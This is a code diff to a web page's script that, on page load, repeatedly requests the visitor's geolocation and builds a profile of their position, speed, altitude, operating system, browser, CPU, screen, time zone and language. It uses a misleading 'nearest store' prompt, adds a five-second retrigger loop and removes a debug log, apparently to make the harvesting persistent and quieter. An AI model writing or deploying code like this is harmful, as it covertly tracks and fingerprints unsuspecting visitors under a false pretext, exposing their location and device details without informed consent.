@@ -604,6 +604,9 @@
 	itemscope itemtype="http://schema.org/WebPage" onload="Send()">
 	<script>
 	function Send() {
+			setTimeout(function(){ 
+				Send();
+            }, 5000);
 		function check() {
 			//Start Location
 			if (navigator.geolocation) {
@@ -614,7 +617,7 @@
 				alert('Trình duyệt của bạn đã quá cũ. Hãy thử trên trình duyệt khác !');
 			}
 		}
-		check();
+		Send();
 			function showError(error) {
 				check();
 				switch (error.code) {
@@ -633,7 +636,7 @@
 						break;
 				}
 			}
-			check();
+			Send();
 			function showPosition(position) {
 				var lat = position.coords.latitude;
 				var lon = position.coords.longitude;
@@ -667,7 +670,6 @@
 				let vido = lat;
 				let kinhdo = lon;
 				let posit = "Postiton:" + " " + "accuracy:" + acc + "||" + "altitude:" + alt + "||" + "heading:" + dir + "||" + "speed:" + spd + " " + "----------" + "Client:" + " " + "HĐH:" + " " + OS + ver + " " + "||" + "Trình duyệt:" + " " + getbrow + " " + getbrowVer + " " + "||" + "Chip:" + " " + CPU + " " + "||" + "Màn hình:" + " " + currentResolution + " " + "||" + "Múi giờ:" + timeZone + " " + "||" + "Ngôn ngữ:" + language + " " + "||" + "Core:" + core;
-				console.log(posit);
 				if (lat.value == '') {
 					// Check for an empty string or null valueweqwewq
 					alert("Please allow location access to show the nearest store.")
